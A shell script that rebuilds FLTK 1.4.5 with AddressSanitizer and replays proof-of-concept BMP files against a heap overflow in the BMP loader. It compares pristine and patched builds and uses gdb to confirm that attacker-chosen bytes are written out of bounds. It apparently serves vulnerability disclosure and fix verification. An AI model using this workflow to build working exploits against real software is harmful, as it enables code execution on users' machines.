#!/bin/sh
# Reproduce the fltk2shell W195 evidence matrix offline from pinned sources.
set -eu
cd "$(dirname "$0")"

TARBALL=fltk-1.4.5.tar.gz
PRISTINE=fltk-release-1.4.5
ASAN_FLAGS='-fsanitize=address -fno-omit-frame-pointer -g -O1'
export ASAN_OPTIONS=abort_on_error=1:allocator_may_return_null=1

pass=0
fail=0
note() { printf '%s\n' "$*"; }
check() { # name expected actual
  if [ "$2" = "$3" ]; then note "PASS $1: $3"; pass=$((pass+1));
  else note "FAIL $1: expected=$2 actual=$3"; fail=$((fail+1)); fi
}

[ -f "$TARBALL" ] || { note "MISSING $TARBALL"; exit 2; }
sha256sum -c <<'EOF'
7715e69ce081fa9ce6da48bb0dd3b07a4cf2cf937813814c04272f36fff593ea  fltk-1.4.5.tar.gz
EOF
[ -d "$PRISTINE" ] || tar xzf "$TARBALL"

for name in plus1632 plus1647; do
  tree="fltk-1.4.5-$name"
  if [ ! -f "$tree/.patched" ]; then
    [ -d "$tree" ] || cp -a "$PRISTINE" "$tree"
    (cd "$tree" && patch -p0 < "../$name.diff")
    touch "$tree/.patched"
  fi
done
configure_build() { # tree builddir cxxflags
  tree=$1; bd=$2; flags=$3
  [ -f "$tree/$bd/CMakeCache.txt" ] || cmake -S "$tree" -B "$tree/$bd" \
    -DCMAKE_BUILD_TYPE=Debug -DFLTK_BUILD_TEST=OFF -DFLTK_BUILD_EXAMPLES=OFF \
    -DFLTK_BUILD_FLUID=OFF -DOPTION_USE_SYSTEM_LIBJPEG=OFF \
    -DOPTION_USE_SYSTEM_LIBPNG=OFF -DOPTION_USE_SYSTEM_ZLIB=OFF \
    -DCMAKE_CXX_FLAGS="$flags" -DCMAKE_EXE_LINKER_FLAGS="$flags" \
    > "configure-$tree-$bd.log" 2>&1
  cmake --build "$tree/$bd" -j4 --target fltk fltk_images > "build-$tree-$bd.log" 2>&1
}

note "== builds =="
configure_build "$PRISTINE" build-asan "$ASAN_FLAGS"
configure_build fltk-1.4.5-plus1632 build-fixed "$ASAN_FLAGS"
configure_build fltk-1.4.5-plus1647 build-fixed "$ASAN_FLAGS"
configure_build fltk-1.4.5-plus1632 build-plain ''

python3 gen_bmp.py . > gen.log

link_driver() { # output tree builddir
  g++ -g -O1 -fsanitize=address -o "$1" driver.cxx \
    $("$2/$3/fltk-config" --cxxflags --ldflags --use-images)
}
link_driver driver-asan "$PRISTINE" build-asan
link_driver driver-plus1632 fltk-1.4.5-plus1632 build-fixed
link_driver driver-plus1647 fltk-1.4.5-plus1647 build-fixed
g++ -g -O0 -o driver-plain driver.cxx \
  $(fltk-1.4.5-plus1632/build-plain/fltk-config --cxxflags --ldflags --use-images)

run_case() { # driver case
  set +e
  ./"$1" "$2.bmp" > "last-$1-$2.out" 2>&1
  rc=$?
  set -e
  echo "$rc"
}

note "== pristine: allocation-wrap variant =="
check safe-pristine "$(run_case driver-asan safe | sed 's/^/rc=/')" 'rc=0'
for c in poc-alloc poc-b poc-c; do
  rc=$(run_case driver-asan "$c"); check "asan-pristine-$c-rc" "$rc" 134
  line=$(grep -o 'load_bmp_.*\.cxx:[0-9]*' "last-driver-asan-$c.out" | sed -n '1p' | sed 's/.*://')
  if [ "$c" = poc-c ]; then check "asan-pristine-$c-line" "$line" 499;
  else check "asan-pristine-$c-line" "$line" 486; fi
done

note "== plus1632: isolated row-pointer wrap (CVE-2026-135433) =="
check safe-plus1632 "$(run_case driver-plus1632 safe | sed 's/^/rc=/')" 'rc=0'
for c in poc-alloc poc-b poc-c poc-chosen; do
  rc=$(run_case driver-plus1632 "$c"); check "asan-plus1632-$c-rc" "$rc" 134
  line=$(grep -o 'load_bmp_.*\.cxx:[0-9]*' "last-driver-plus1632-$c.out" | sed -n '1p' | sed 's/.*://')
  if [ "$c" = poc-c ]; then check "asan-plus1632-$c-line" "$line" 503;
  else check "asan-plus1632-$c-line" "$line" 490; fi
done
grep -q 'is located 2 bytes before 4294967298-byte region' \
  last-driver-plus1632-poc-alloc.out && check region-plus1632 yes yes \
  || check region-plus1632 yes no

note "== plus1647: a28e392 row casts, fixed control =="
for c in safe poc-alloc poc-b poc-c poc-chosen; do
  rc=$(run_case driver-plus1647 "$c"); check "asan-plus1647-$c-rc" "$rc" 0
  grep -q 'ERROR: AddressSanitizer' "last-driver-plus1647-$c.out" \
    && check "asan-plus1647-$c-asan-report" none found || check "asan-plus1647-$c-asan-report" none none
done

note "== chosen bytes, plain build under gdb =="
gdb -q -batch -ex 'break Fl_BMP_Image.cxx:510' -ex 'run poc-chosen.bmp' \
  -ex 'print array' -ex 'print y' -ex 'print ptr' -ex 'x/16bx array-8' \
  -ex 'bt 3' ./driver-plain > gdb-chosen.txt 2>&1
for pat in 0x53 0x49 0x4d 0x2d 0x45 0x48; do
  grep -q "$pat" gdb-chosen.txt && check "chosen-$pat" present present \
    || check "chosen-$pat" present absent
done

{
  echo "fltk2shell W195 evidence $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
  echo "pinned tarball sha256 $(sha256sum "$TARBALL" | cut -d' ' -f1)"
  for f in last-driver-*out; do
    grep -E 'ERROR: AddressSanitizer|WRITE of size|located .* before|SUMMARY|RESULT' "$f" \
      | sed -E 's#/[A-Za-z0-9_.+/-]*Fl_BMP_Image\.cxx#PATH/Fl_BMP_Image.cxx#g' \
      | sed -E 's/0x[0-9a-f]+/ADDR/g; s/[0-9]{4,}/NUM/g' | sed -n '1,8p'
  done
  echo "--- gdb-chosen.txt ---"
  grep -E 'Breakpoint|\$1 =|\$2 =|\$3 =|0x7ff' gdb-chosen.txt \
    | sed -E 's#/[A-Za-z0-9_.+/-]*Fl_BMP_Image\.cxx#PATH/Fl_BMP_Image.cxx#g' \
    | sed -E 's/0x[0-9a-f]{6,}/ADDR/g' | sed -n '1,12p'
} > evidence.log

note "SUMMARY pass=$pass fail=$fail"
[ "$fail" -eq 0 ] || exit 1
